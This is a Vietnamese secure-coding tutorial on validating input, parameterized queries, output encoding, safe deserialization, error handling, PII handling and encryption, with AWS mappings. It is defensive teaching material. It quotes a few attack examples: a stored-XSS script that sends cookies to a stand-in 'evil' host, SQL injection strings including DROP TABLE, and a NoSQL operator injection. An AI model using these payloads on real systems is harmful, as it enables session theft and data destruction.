# Secure Coding: input, output & data

Phần lớn lỗ hổng nghiêm trọng không nằm ở thuật toán phức tạp, mà nằm ở chỗ dữ liệu đi vào và đi ra khỏi code của bạn. Là kỹ sư xây hệ thống, bạn không cần biết viết exploit — bạn cần biết dữ liệu nào *không tin được*, nó sẽ bị diễn giải lại ở đâu (SQL engine, trình duyệt, shell, deserializer), và đặt rào chắn đúng chỗ. Bài này đi theo dòng đời của dữ liệu: **vào → xử lý → ra → lưu trữ**.

> 💡 **Nguyên tắc**: Mọi dữ liệu từ bên ngoài process của bạn (HTTP request, file upload, message queue, response của service khác, biến môi trường người dùng kiểm soát) đều là *untrusted* cho đến khi được validate. "Bên ngoài" gồm cả service nội bộ — zero trust không dừng ở mạng.

## 1. Validate input: allowlist, không phải blocklist

Sai lầm kinh điển là cố liệt kê những thứ *xấu* để chặn (blocklist). Attacker chỉ cần một biến thể bạn chưa nghĩ ra. Hãy định nghĩa cái *được phép* (allowlist) và từ chối phần còn lại.

Ví dụ tấn công: một endpoint nhận `?sort=name` rồi nhét thẳng vào câu SQL `ORDER BY name`. Attacker gửi `?sort=name; DROP TABLE users--`. Bạn thử chặn dấu `;` và `--`, nhưng họ dùng `sort=(SELECT CASE WHEN ...)` để blind SQLi. Blocklist thua.

```python
# ❌ TRƯỚC: blocklist + nội suy chuỗi
BAD = [";", "--", "drop"]
def build_query(sort):
    if any(b in sort.lower() for b in BAD):
        raise ValueError("invalid")
    return f"SELECT * FROM users ORDER BY {sort}"  # vẫn injectable

# ✅ SAU: allowlist — chỉ map các giá trị hợp lệ đã biết
ALLOWED_SORT = {
    "name":    "name ASC",
    "name_desc": "name DESC",
    "created": "created_at DESC",
}
def build_query(sort: str) -> str:
    clause = ALLOWED_SORT.get(sort)
    if clause is None:
        raise ValueError("unknown sort key")  # default deny
    return f"SELECT * FROM users ORDER BY {clause}"
```

Với dữ liệu có cấu trúc (body JSON, query params), dùng schema validation thay vì check thủ công. Validate ở **ranh giới** (boundary) ngay khi nhận, rồi truyền các object đã được kiểm chứng vào sâu bên trong.

```typescript
// Node.js + zod: validate & ép kiểu tại boundary
import { z } from "zod";

const CreateUser = z.object({
  email: z.string().email().max(254),
  age: z.number().int().min(0).max(150),
  role: z.enum(["viewer", "editor"]),          // allowlist nội tại
  tags: z.array(z.string().regex(/^[a-z0-9-]{1,32}$/)).max(10),
});

app.post("/users", (req, res) => {
  const parsed = CreateUser.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "invalid payload" }); // không lộ chi tiết internal
  }
  const user = parsed.data; // từ đây trở đi: typed + trusted
  createUser(user);
});
```

> ⚠️ **Lỗ hổng — Mass assignment**: `User.create(req.body)` cho phép attacker thêm `{"is_admin": true}` vào body. Luôn allowlist các field được nhận; đừng bind thẳng request vào model/ORM.

**Checklist validate input**
- [ ] Validate tại boundary (controller/handler), không rải rác trong business logic.
- [ ] Allowlist kiểu, độ dài, range, format (regex neo `^...$`), enum.
- [ ] Chuẩn hoá (canonicalize/normalize Unicode NFC) *trước* khi validate để tránh bypass.
- [ ] Default deny: thiếu rule = từ chối, không phải cho qua.
- [ ] Giới hạn kích thước payload, độ sâu JSON, số phần tử mảng (chống DoS).

## 2. Parameterized query / prepared statement

Validate input là *defense in depth*, không phải lớp bảo vệ duy nhất chống SQLi. Lớp đúng đắn là **tách dữ liệu khỏi mã lệnh**: dùng placeholder, để driver gửi data riêng. Khi đó dù input chứa `' OR 1=1--`, nó vẫn chỉ là một chuỗi giá trị, không bao giờ được parse thành SQL.

```python
# ❌ TRƯỚC: nội suy → SQL injection
cur.execute(f"SELECT * FROM users WHERE email = '{email}'")

# ✅ SAU: parameterized — driver bind tham số an toàn
cur.execute("SELECT * FROM users WHERE email = %s", (email,))
```

```java
// Java JDBC: PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT id FROM accounts WHERE owner = ? AND status = ?");
ps.setString(1, owner);
ps.setString(2, status);
ResultSet rs = ps.executeQuery();
```

Lưu ý: placeholder chỉ bind được **giá trị**, không bind được **tên bảng/cột hay từ khoá** (`ORDER BY`, `LIMIT` đôi khi cũng vướng). Đó chính là chỗ phải quay lại allowlist như mục 1. Nguyên tắc tương tự áp dụng cho NoSQL (ví dụ MongoDB: đừng truyền object thô từ user vào filter — `{ "$gt": "" }` là NoSQL injection), cho LDAP, và cho OS command (dùng API truyền **mảng** `args`, không ghép chuỗi đưa vào shell).

```go
// Go: tránh command injection — truyền args, KHÔNG dùng "sh -c <chuỗi>"
cmd := exec.Command("convert", inputPath, "-resize", "100x100", outputPath)
// ❌ exec.Command("sh", "-c", "convert "+inputPath+" ...")
```

> 💡 **Nguyên tắc**: Với mỗi interpreter (SQL, shell, LDAP, XPath, template engine), tìm cơ chế "data ≠ code" của nó (parameter binding, arg array) và dùng nó *mặc định*. Nội suy chuỗi vào ngôn ngữ khác là code smell cần review.

## 3. Output encoding theo context

Input đã sạch không có nghĩa là output an toàn. Cùng một chuỗi `"<b>"` vô hại trong HTML body lại nguy hiểm trong thuộc tính, trong `<script>`, hay trong URL. **Encoding phải theo đúng context nơi dữ liệu được đặt vào.** Đây là gốc rễ của XSS.

Ví dụ tấn công (Stored XSS): user đặt display name là `<script>fetch('//evil/?c='+document.cookie)</script>`. Khi trang khác render tên này thẳng vào HTML, script chạy trong phiên của nạn nhân → đánh cắp session.

| Context đặt dữ liệu | Encoding cần dùng | Ví dụ ký tự xử lý |
|---|---|---|
| HTML body / text node | HTML entity encode | `<` → `<`, `&` → `&` |
| HTML attribute (có quote) | Attribute encode + luôn quote | `"` → `"` |
| Bên trong `<script>` / JS | JS string encode (hoặc `JSON.stringify`) | `</`, `'`, newline |
| URL query/path component | URL/percent encode | space → `%20` |
| CSS value | CSS encode | escape `\` |

```jsx
// ✅ React mặc định HTML-encode mọi {biểu thức} trong JSX
function Profile({ name }) {
  return <span>{name}</span>; // an toàn cho HTML body context
}

// ⚠️ Các "cửa hậu" bỏ qua encoding — chỉ dùng với nội dung đã sanitize
<div dangerouslySetInnerHTML={{ __html: sanitize(userHtml) }} />
```

```javascript
// Nếu phải nhúng data vào <script> server-side, encode đúng context JS:
const safe = JSON.stringify(userData)            // encode JS string/object
  .replace(/</g, "\\u003c");                      // chặn </script> breakout
res.send(`<script>window.__DATA__ = ${safe};</script>`);
```

> ⚠️ **Lỗ hổng — sai context**: HTML-encode một giá trị rồi nhét vào `href="javascript:..."` hay vào `<script>` không hề an toàn, vì `<` không phải ký tự nguy hiểm trong JS context. Encode đúng *đích đến*, không phải đúng *nguồn*.

Với rich text do user nhập (cho phép một số thẻ), đừng tự viết regex lọc thẻ — dùng thư viện sanitize đã được kiểm chứng (DOMPurify ở client, các sanitizer maintained ở server) với allowlist thẻ/thuộc tính. Bổ sung **Content-Security-Policy** làm lớp chặn cuối: dù lọt một XSS, CSP `script-src 'self'` ngăn inline script và domain lạ thực thi.

## 4. Tránh deserialization nguy hiểm

Deserialize dữ liệu untrusted bằng cơ chế cho phép tạo object tuỳ ý là một trong những lỗ hổng dễ dẫn tới RCE (remote code execution) nhất. Vấn đề: định dạng "native object" (Java serialization, Python `pickle`, PHP `unserialize`, .NET `BinaryFormatter`, YAML với tag) có thể *khởi tạo class bất kỳ và chạy code* trong lúc dựng lại object.

Ví dụ tấn công: API nhận một cookie/field là object Java đã serialize. Attacker gửi một "gadget chain" (chuỗi object lợi dụng các class có sẵn trong classpath) khiến server chạy lệnh khi `readObject()` được gọi — không cần biết mật khẩu, không cần lỗ hổng nào khác.

```python
# ❌ TRƯỚC: pickle trên dữ liệu từ network = RCE
import pickle
obj = pickle.loads(request.body)     # body do attacker kiểm soát

# ✅ SAU: dùng định dạng data-only + schema
import json
data = json.loads(request.body)      # JSON không thể khởi tạo class/chạy code
user = CreateUser(**validate(data))  # validate rồi mới dựng object có kiểm soát
```

Nguyên tắc thực dụng:
- Dùng **data formats** (JSON, Protobuf, MessagePack) cho dữ liệu qua ranh giới tin cậy — chúng mang dữ liệu, không mang hành vi.
- Không bao giờ `pickle.loads` / Java native deserialize / `BinaryFormatter` / `yaml.load` (dùng `yaml.safe_load`) trên input untrusted.
- Nếu buộc phải deserialize sang object, dùng cơ chế bind **theo schema/type cụ thể** (Jackson với type cố định, không bật polymorphic typing với input ngoài), và allowlist class.
- XML: tắt external entity (chống **XXE**) — `disallow-doctype-decl` hoặc tắt DTD/external entities trong parser.

> 💡 **Nguyên tắc**: Hỏi "định dạng này có thể *tạo ra hành vi*, hay chỉ mang *dữ liệu*?". Nếu mang hành vi, không dùng nó với input từ ngoài.

## 5. Xử lý lỗi không làm lộ thông tin

Thông báo lỗi là kênh rò rỉ kinh điển. Stack trace, câu SQL gốc, đường dẫn file, phiên bản framework, hay sự khác biệt giữa "user không tồn tại" và "sai mật khẩu" đều giúp attacker do thám và tấn công có chủ đích.

Ví dụ tấn công (user enumeration): form login trả `"Email không tồn tại"` vs `"Sai mật khẩu"`. Attacker dò được danh sách email hợp lệ → tập trung brute-force/credential stuffing. Phòng: thông điệp đồng nhất + so sánh thời gian không đổi để tránh timing oracle.

```python
# ❌ TRƯỚC: lộ chi tiết + cho phép enumeration
try:
    user = db.get_user(email)        # raise nếu không có
    if user.password_hash != hash(pw):
        return {"error": "Wrong password"}, 401
except Exception as e:
    return {"error": str(e), "trace": traceback.format_exc()}, 500

# ✅ SAU: thông điệp generic ra ngoài, chi tiết chỉ vào log nội bộ
try:
    user = db.get_user(email)
    ok = user is not None and verify_password(pw, user.password_hash)
    if not ok:
        return {"error": "Email hoặc mật khẩu không đúng"}, 401  # đồng nhất
    ...
except Exception:
    logger.exception("login failed", extra={"req_id": req_id})   # trace vào log
    return {"error": "Đã có lỗi xảy ra", "request_id": req_id}, 500
```

**Checklist xử lý lỗi**
- [ ] Client chỉ nhận thông điệp generic + một `request_id` để đối soát; chi tiết nằm trong log.
- [ ] Tắt debug/stack trace ở môi trường production.
- [ ] Thông điệp auth/login đồng nhất (không phân biệt user tồn tại hay không).
- [ ] Fail closed: khi không chắc, từ chối truy cập — không "fail open" cho qua.
- [ ] Đừng log secret/PII vào trace (xem mục dưới).

## 6. Quản lý PII/PHI & data classification

Bạn không thể bảo vệ thứ bạn chưa phân loại. **Data classification** là gán nhãn cho dữ liệu theo mức nhạy cảm, từ đó suy ra cách xử lý (lưu, log, truyền, ai được xem, giữ bao lâu).

| Lớp | Ví dụ | Yêu cầu xử lý điển hình |
|---|---|---|
| Public | tên sản phẩm, blog | không hạn chế |
| Internal | log hệ thống, metric | chỉ trong tổ chức |
| Confidential / PII | email, địa chỉ, số điện thoại | encrypt, access control, audit |
| Restricted / PHI / secret | hồ sơ y tế, số thẻ, mật khẩu | encrypt mạnh, tối thiểu hoá, không log, retention chặt |

PII (Personally Identifiable Information) và PHI (Protected Health Information — phạm vi HIPAA) cần xử lý đặc biệt:

- **Data minimization**: chỉ thu thập và lưu thứ thật sự cần. Dữ liệu không lưu thì không thể bị lộ.
- **Không log PII/PHI/secret**. Mask khi cần debug.
- **Tokenization/pseudonymization**: thay giá trị nhạy cảm bằng token; bản gốc giữ trong vault riêng.
- **Retention & deletion**: định thời gian giữ; hỗ trợ quyền xoá (GDPR right to erasure).
- **Mật khẩu**: không "encrypt" — phải **hash** bằng thuật toán chậm (bcrypt/argon2/scrypt) + per-user salt.

```typescript
// Mask PII trong log
const maskEmail = (e: string) =>
  e.replace(/^(.).*(@.*)$/, "$1***$2");        // a***@x.com

logger.info("user login", { email: maskEmail(user.email), userId: user.id });
// ❌ logger.info("user login", { user });  // dump cả object → rò rỉ PII

// Hash mật khẩu (KHÔNG mã hoá có thể giải ngược)
import bcrypt from "bcrypt";
const hash = await bcrypt.hash(password, 12);   // cost factor ~12
const ok = await bcrypt.compare(input, hash);   // so sánh constant-time
```

> ⚠️ **Lỗ hổng — secret/PII trong log & analytics**: log tập trung, APM, error tracker (Sentry...) thường được nhiều người xem và lưu lâu. Một dòng `console.log(req.body)` có thể đẩy số thẻ vào hệ thống không đạt chuẩn lưu trữ dữ liệu nhạy cảm. Redact ở tầng logger.

## 7. Encryption at rest & in transit trong code

Phân loại dữ liệu xong, encryption là cách thực thi nó về mặt kỹ thuật, ở hai trạng thái:

**In transit** — dữ liệu đang di chuyển trên mạng:
- TLS ở mọi nơi, gồm cả traffic *nội bộ* giữa các service (không tin cậy mạng nội bộ).
- Bật HSTS; từ chối downgrade về HTTP. Verify certificate (đừng tắt verify cho "tiện").

```python
# ❌ TRƯỚC: tắt verify TLS — mở đường cho man-in-the-middle
requests.get(url, verify=False)

# ✅ SAU: verify mặc định (đúng); pin/CA bundle nếu cần
requests.get(url)   # verify=True là mặc định — đừng tắt
```

**At rest** — dữ liệu đang lưu (DB, file, backup, object storage):
- Mã hoã ở tầng storage/DB; với field cực nhạy cảm có thể mã hoá ở tầng application (envelope encryption).
- **Đừng tự cài thuật toán crypto.** Dùng thư viện cấp cao đã được audit và một **KMS** để quản lý key.
- **Key management** là phần khó hơn cả thuật toán: tách key khỏi dữ liệu, rotate định kỳ, phân quyền dùng key, audit truy cập key. Secret/key **không bao giờ** nằm trong source code hay commit vào Git — dùng secret manager.

```python
# Envelope encryption ở tầng app cho 1 field nhạy cảm (vd. số bảo hiểm)
# DEK (data key) do KMS cấp; chỉ lưu ciphertext của DEK kèm dữ liệu.
from cryptography.fernet import Fernet   # AEAD: mã hoá + xác thực toàn vẹn

plaintext_dek = get_data_key_from_kms()              # KMS sinh & bọc key
token = Fernet(plaintext_dek).encrypt(ssn.encode())  # lưu `token` vào DB
# Khi đọc: xin KMS giải mã wrapped DEK → giải mã field.
```

> 💡 **Nguyên tắc**: Encryption chuyển bài toán "bảo vệ dữ liệu" thành "bảo vệ key". Nếu key nằm cạnh dữ liệu (hardcode, cùng repo, cùng quyền truy cập), bạn chưa bảo vệ được gì.

## Tổng kết nhanh

- Untrusted input → validate bằng **allowlist** tại boundary.
- Sang interpreter khác → **tách data khỏi code** (parameterized query, arg array).
- Đưa data ra ngoài → **encode theo context** (chống XSS).
- Đừng **deserialize** định dạng mang hành vi từ input ngoài.
- Lỗi ra ngoài **generic**; chi tiết vào log; **fail closed**.
- **Phân loại** dữ liệu; tối thiểu hoá & không log PII/PHI/secret.
- **Encrypt** in transit + at rest; bài toán thật là **key management**.

## Liên hệ sang AWS

Những nguyên tắc trên ánh xạ trực tiếp sang dịch vụ AWS khi bạn xây trên cloud:

- **Input/output ở edge** — **AWS WAF** đứng trước CloudFront/ALB/API Gateway, có managed rule cho SQLi và XSS; là lớp *defense in depth*, không thay thế parameterized query và output encoding trong code.
- **Secret & key management** — **AWS Secrets Manager** / **SSM Parameter Store (SecureString)** giữ DB credential, API key ngoài source code (có rotation tự động). **AWS KMS** quản lý CMK cho envelope encryption; cấp quyền dùng key qua key policy + IAM, mọi lần dùng được log ở CloudTrail.
- **Encryption at rest** — bật mã hoá KMS cho **S3**, **RDS/Aurora**, **EBS**, **DynamoDB**; ép TLS in transit bằng bucket policy / security group, dùng ACM cấp và tự rotate certificate.
- **Least privilege & data access** — **IAM** policy hẹp cho từng service/role (không dùng `*`); **S3 Block Public Access** + bucket policy chống lộ dữ liệu; **Amazon Macie** tự phát hiện PII/PHI trong S3 phục vụ data classification.
- **Phát hiện & phản ứng** — **GuardDuty** phát hiện hành vi bất thường (credential bị lạm dụng, gọi API lạ); **CloudTrail** + **CloudWatch Logs** lưu audit, kết hợp redact PII ở tầng logger trước khi đẩy log.
- **Bảo vệ secret trong CI/CD** — bật quét secret (ví dụ tích hợp scan trong pipeline / push protection) để chặn key lọt vào repo ngay từ commit.
